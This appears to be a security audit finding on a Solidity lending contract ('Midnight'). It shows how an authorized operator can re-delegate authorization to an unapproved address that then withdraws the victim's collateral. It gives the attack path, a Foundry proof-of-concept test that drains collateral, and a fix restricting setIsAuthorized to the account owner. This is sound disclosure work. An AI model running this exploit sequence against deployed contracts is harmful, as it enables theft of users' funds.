### Title
Authorized Operator Can Transitively Delegate Full Authorization to Arbitrary Addresses, Enabling Unauthorized Collateral Seizure - (File: src/Midnight.sol)

### Summary
`setIsAuthorized` permits any address already authorized by `onBehalf` to call `setIsAuthorized` again on behalf of that same `onBehalf`, granting authorization to any third party. Because `withdrawCollateral` (and `withdraw`, `repay`, `setConsumed`) all accept `isAuthorized[onBehalf][msg.sender]` as sufficient proof of authority, an authorized operator can silently extend the full authorization set to an attacker-controlled address. The victim never directly authorized the attacker, violating the invariant that authorization must only allow intended account delegation.

### Finding Description
**Root cause — `src/Midnight.sol` lines 731–735:**

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
}
```

The guard `isAuthorized[onBehalf][msg.sender]` is the same check used by every other privileged function (`withdrawCollateral`, `withdraw`, `repay`, `supplyCollateral`, `setConsumed`). There is no distinction between "the account owner is calling" and "a delegated operator is calling." Any authorized operator therefore inherits the power to re-delegate, with no depth limit.

**Exact reachable path:**

1. **Precondition**: `victim` legitimately calls `setIsAuthorized(operator, true, victim)` → `isAuthorized[victim][operator] = true`.
2. **Step 1** — `operator` (attacker-controlled) calls `setIsAuthorized(attacker, true, victim)`:
   - Guard: `victim == operator` → false; `isAuthorized[victim][operator]` → **true** → passes.
   - Effect: `isAuthorized[victim][attacker] = true`.
3. **Step 2** — `attacker` calls `withdrawCollateral(market, collateralIndex, assets, victim, attacker)`:
   - Guard (`src/Midnight.sol` line 556): `victim == attacker` → false; `isAuthorized[victim][attacker]` → **true** → passes.
   - Effect: victim's collateral is transferred to `attacker`.

The chain can be extended arbitrarily (operator → hop1 → hop2 → … → attacker) because each hop passes the same single-level `isAuthorized` check.

**Existing test confirms the behavior is reachable** (`test/AuthorizationTest.sol` lines 290–304):
```solidity
vm.prank(user);
midnight.setIsAuthorized(authorized, true, user);

vm.prank(authorized);
midnight.setIsAuthorized(newAuthorized, true, user); // succeeds — no check prevents this

assertEq(midnight.isAuthorized(user, newAuthorized), true);
``` [1](#0-0) [2](#0-1) [3](#0-2) 

**Why existing checks are insufficient:**
The Certora spec (`certora/specs/OnlyAuthorizedCanChange.spec` lines 102–110) only asserts that `isAuthorized` cannot change unless `authorizerIsAuthorized`, where `authorizerIsAuthorized = authorizer == e.msg.sender || isAuthorized(authorizer, e.msg.sender)`. This property is satisfied by the attack — the operator IS authorized — so the formal spec does not catch the transitive delegation problem. [4](#0-3) 

### Impact Explanation
An attacker who controls any address that `victim` has ever authorized (e.g., a peripheral contract, a compromised EOA, or a contract the attacker deployed and convinced the victim to authorize) can silently grant themselves `isAuthorized[victim][attacker] = true` and then call `withdrawCollateral` to drain all of the victim's collateral to an arbitrary `receiver`. The same path applies to `withdraw` (credit) and `repay` (debt manipulation). The victim has no on-chain signal that their authorization set has been extended.

### Likelihood Explanation
**Preconditions**: victim must have authorized at least one address the attacker controls or can influence. This is a realistic scenario whenever victims authorize peripheral contracts (e.g., `MidnightBundles`, `EcrecoverAuthorizer`, or any third-party integration). The `EcrecoverAuthorizer` itself checks `isAuthorized(authorization.authorizer, signer)` before calling `setIsAuthorized` on Midnight, meaning a compromised or malicious signer already authorized by the victim can use `EcrecoverAuthorizer` to extend authorization to the attacker. [5](#0-4) 

The attack is repeatable, requires no special privileges, no oracle manipulation, and no flash loans.

### Recommendation
Restrict `setIsAuthorized` so that only the account owner (`onBehalf == msg.sender`) can modify their own authorization mapping. Remove the `isAuthorized[onBehalf][msg.sender]` branch from the guard entirely:

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender, Unauthorized());
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
}
```

If delegated authorization-setting is a desired feature, introduce an explicit `canDelegate` flag or a separate `setIsAuthorizedOnBehalf` function with a stricter scope, and update the Certora spec to assert that only `onBehalf == msg.sender` can change `isAuthorized[onBehalf][*]`.

### Proof of Concept
```solidity
// Foundry unit test — add to test/AuthorizationTest.sol
function testTransitiveDelegationDrainsCollateral() public {
    address victim   = makeAddr("victim");
    address operator = makeAddr("operator");   // victim trusts this
    address attacker = makeAddr("attacker");   // victim never authorized this

    address collateralToken = market.collateralParams[0].token;
    uint256 amount = 1_000e18;

    // Victim supplies collateral
    deal(collateralToken, victim, amount);
    vm.prank(victim); ERC20(collateralToken).approve(address(midnight), amount);
    vm.prank(victim); midnight.supplyCollateral(market, 0, amount, victim);

    // Victim authorizes operator (legitimate action)
    vm.prank(victim); midnight.setIsAuthorized(operator, true, victim);

    // Operator (attacker-controlled) silently grants attacker authorization
    vm.prank(operator); midnight.setIsAuthorized(attacker, true, victim);

    // Attacker — never authorized by victim — drains collateral
    vm.prank(attacker);
    midnight.withdrawCollateral(market, 0, amount, victim, attacker);

    // Assertions
    assertEq(ERC20(collateralToken).balanceOf(attacker), amount, "attacker stole collateral");
    assertEq(midnight.collateral(toId(market), victim, 0), 0,    "victim collateral zeroed");
}
```

Expected: test passes (demonstrating the bug). After the fix (`onBehalf == msg.sender` only), the `operator` call to `setIsAuthorized` reverts with `Unauthorized`, and the attacker's `withdrawCollateral` also reverts. [1](#0-0) [6](#0-5)

### Citations

**File:** src/Midnight.sol (L549-573)
```text
    function withdrawCollateral(
        Market memory market,
        uint256 collateralIndex,
        uint256 assets,
        address onBehalf,
        address receiver
    ) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        bytes32 id = touchMarket(market);
        address collateralToken = market.collateralParams[collateralIndex].token;

        Position storage _position = position[id][onBehalf];
        uint256 newCollateral = _position.collateral[collateralIndex] - assets;
        _position.collateral[collateralIndex] = UtilsLib.toUint128(newCollateral);

        if (newCollateral == 0 && assets > 0) {
            _position.collateralBitmap = _position.collateralBitmap.clearBit(collateralIndex);
        }

        require(isHealthy(market, id, onBehalf), UnhealthyBorrower());

        emit EventsLib.WithdrawCollateral(msg.sender, id, collateralToken, assets, onBehalf, receiver);

        SafeTransferLib.safeTransfer(collateralToken, receiver, assets);
    }
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```

**File:** test/AuthorizationTest.sol (L290-304)
```text
    function testSetIsAuthorizedAuthorization(address user, address authorized, address newAuthorized) public {
        vm.assume(user != authorized);

        vm.prank(authorized);
        vm.expectRevert(IMidnight.Unauthorized.selector);
        midnight.setIsAuthorized(newAuthorized, true, user);

        vm.prank(user);
        midnight.setIsAuthorized(authorized, true, user);

        vm.prank(authorized);
        midnight.setIsAuthorized(newAuthorized, true, user);

        assertEq(midnight.isAuthorized(user, newAuthorized), true);
    }
```

**File:** certora/specs/OnlyAuthorizedCanChange.spec (L102-110)
```text
rule onlyAuthorizedCanChangeIsAuthorized(env e, method f, calldataarg args, address authorizer, address authorized) filtered { f -> !f.isView } {
    bool authorizerIsAuthorized = authorizer == e.msg.sender || isAuthorized(authorizer, e.msg.sender);

    bool isAuthorizedBefore = isAuthorized(authorizer, authorized);
    f(e, args);
    bool isAuthorizedAfter = isAuthorized(authorizer, authorized);

    assert isAuthorizedAfter == isAuthorizedBefore || authorizerIsAuthorized;
}
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L33-47)
```text
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```
